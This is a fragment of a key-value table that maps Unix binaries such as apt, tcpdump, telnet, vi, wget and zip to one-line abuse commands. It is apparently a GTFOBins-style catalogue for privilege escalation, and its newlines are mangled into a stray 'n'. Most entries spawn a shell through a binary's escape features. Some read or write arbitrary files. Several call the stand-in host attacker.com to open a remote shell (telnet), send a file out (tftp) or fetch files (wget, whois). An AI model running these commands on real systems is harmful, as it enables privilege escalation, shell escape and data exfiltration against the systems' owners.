"apt"| "apt-get changelog aptn!/bin/shn", 
"tcpdump"| "COMMAND='id'nTF=$(mktemp)necho "$COMMAND" > $TFnchmod +x $TFntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TFn", 
"tee"| "LFILE=file_to_writenecho DATA | ./tee -a "$LFILE"n", 
"telnet"| "RHOST=attacker.comnRPORT=12345ntelnet $RHOST $RPORTn^]n!/bin/shn", 
"tftp"| "RHOST=attacker.comnsudo -E tftp $RHOSTnput file_to_sendn", 
"time"| "/usr/bin/time /bin/sh", 
"timeout"| "timeout 7d /bin/sh", 
"ul"| "LFILE=file_to_readnul "$LFILE"n", 
"unexpand"| "LFILE=file_to_readnunexpand -t99999999 "$LFILE"n", 
"uniq"| "LFILE=file_to_readnuniq "$LFILE"n", 
"unshare"| "unshare /bin/sh", 
"vi"| "vi -c '|!/bin/sh'", 
"vim"| "vim -c '|!/bin/sh'", 
"watch"| "watch -x sh -c 'reset; exec sh 1>&0 2>&0'", 
"wget"| "export URL=http|//attacker.com/file_to_getnexport LFILE=file_to_savensudo -E wget $URL -O $LFILEn", 
"whois"| "RHOST=attacker.comnRPORT=12345nLFILE=file_to_savenwhois -h $RHOST -p $RPORT > "$LFILE"n", 
"wish"| "wishnexec /bin/sh <@stdin >@stdout 2>@stderrn", 
"xargs"| "xargs -a /dev/null sh", 
"xxd"| "LFILE=file_to_writenecho DATA | xxd | xxd -r - "$LFILE"n", 
"zip"| "TF=$(mktemp -u)nzip $TF /etc/hosts -T -TT 'sh #'nrm $TFn", 
"zsh"| "zsh"
